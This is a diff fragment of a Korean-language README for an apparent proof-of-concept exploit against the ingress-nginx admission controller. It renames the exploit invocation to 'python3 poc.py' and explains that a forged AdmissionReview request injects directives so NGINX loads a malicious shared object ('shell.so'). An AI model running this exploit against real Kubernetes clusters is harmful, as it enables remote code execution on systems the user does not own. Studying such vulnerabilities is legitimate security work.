@@ -47,7 +47,7 @@ gcc -shared -fPIC -o shell.so shell.c
 2. 위의 소스 코드를 적절한 환경으로 컴파일한 후 exploit.py를 사용하여 취약점을 악용
 
 ```
-python exploit.py -a https://localhost:30443/networking/v1/ingresses -i http://localhost:30080/fake/addr -s shell.so
+python3 poc.py -a https://localhost:30443/networking/v1/ingresses -i http://localhost:30080/fake/addr -s shell.so
 ```
 <kbd>AdmissionReview</kbd> exploit은 NGINX가 악성 동적 공유 객체를 로드하도록 강제하는 지시어 주입 요청을 위조하여 작동한다.
 
